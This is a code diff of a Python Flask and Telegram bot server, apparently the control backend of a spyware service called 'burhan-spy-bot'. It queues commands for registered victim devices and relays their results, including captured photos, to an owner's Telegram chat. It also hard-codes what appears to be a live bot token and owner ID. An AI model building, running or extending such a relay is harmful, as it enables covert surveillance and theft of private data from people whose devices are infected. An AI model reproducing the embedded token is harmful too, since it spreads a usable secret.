@@ -9,11 +9,11 @@ from flask import Flask, request, jsonify
 import base64
 import io
 
-# ===== CONFIGURATION (REPLACE THESE) =====
-BOT_TOKEN = "8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM"
-OWNER_ID = 2062068620  # Your Telegram user ID
+# ===== CONFIGURATION =====
+BOT_TOKEN = "8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM"  # Replace with your bot token
+OWNER_ID = 2062068620          # Your Telegram user ID
 PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"
-SERVER_PORT = 5000
+SERVER_PORT = 3000             # Railway expects port 3000 (from screenshot)
 
 # ===== DATABASE SETUP =====
 DB_FILE = "devices.db"
@@ -31,9 +31,8 @@ conn.commit()
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# In-memory command queue (device_id -> command dict)
+# In-memory command queue and results
 device_commands = {}
-# In-memory results (device_id -> result dict)
 device_results = {}
 
 # ===== HELPER FUNCTIONS =====
@@ -45,10 +44,6 @@ def db_add_device(device_id, key, expiry):
 def db_get_all_devices():
     c.execute("SELECT device_id, key, expiry FROM devices")
     return c.fetchall()
-
-def db_get_device(device_id):
-    c.execute("SELECT * FROM devices WHERE device_id=?", (device_id,))
-    return c.fetchone()
 
 def is_owner(message):
     return message.chat.id == OWNER_ID
@@ -210,7 +205,6 @@ def post_result():
     result = data.get('result')
     msg_type = data.get('type', 'text')
     if msg_type == 'photo':
-        # result is base64 string
         photo_bytes = base64.b64decode(result)
         bio = io.BytesIO(photo_bytes)
         bio.name = "photo.jpg"
@@ -230,4 +224,4 @@ def run_bot():
 
 if __name__ == "__main__":
     Thread(target=run_bot).start()
-    app.run(host="0.0.0.0", port=SERVER_PORT)
+    app.run(host="0.0.0.0", port=SERVER_PORT)  # Port 3000
